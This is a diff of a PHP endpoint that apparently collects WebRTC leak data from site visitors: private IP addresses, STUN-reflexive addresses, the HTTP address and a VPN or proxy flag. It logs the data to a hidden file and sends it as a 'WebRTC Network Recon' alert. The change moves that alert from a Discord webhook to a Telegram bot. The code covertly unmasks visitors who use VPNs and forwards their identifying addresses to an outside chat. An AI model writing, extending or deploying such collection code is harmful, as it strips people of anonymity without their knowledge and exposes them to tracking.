@@ -34,9 +34,9 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     exit;
 }
 
-/* ── Discord Webhook Integration ────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
 }
 
 /* ── Data directory ─────────────────────────────────────────────── */
@@ -216,13 +216,13 @@ if ($fp2) {
 // formatted block that was already printed via php://stderr.
 file_put_contents($data_dir . '/.flag_webrtc', $log_block);
 
-/* ── 5. Discord Notification: WebRTC Network Recon ── */
+/* ── 5. Telegram Notification: WebRTC Network Recon ── */
 $vpnLabel     = $vpn_flag ? '🔴 YES -- VPN / Proxy Detected' : '🟢 No (Direct Connection)';
 $privateLabel = !empty($host_ips)  ? implode(', ', $host_ips)  : 'None';
 $stunLabel    = !empty($srflx_ips) ? implode(', ', $srflx_ips) : 'None';
 $httpLabel    = $http_ip !== '' ? $http_ip : 'Unknown';
 
-sendDiscordAlert(
+sendTelegramAlert(
     '🔍 WebRTC Network Recon',
     [
         'Private IP(s)'    => $privateLabel,
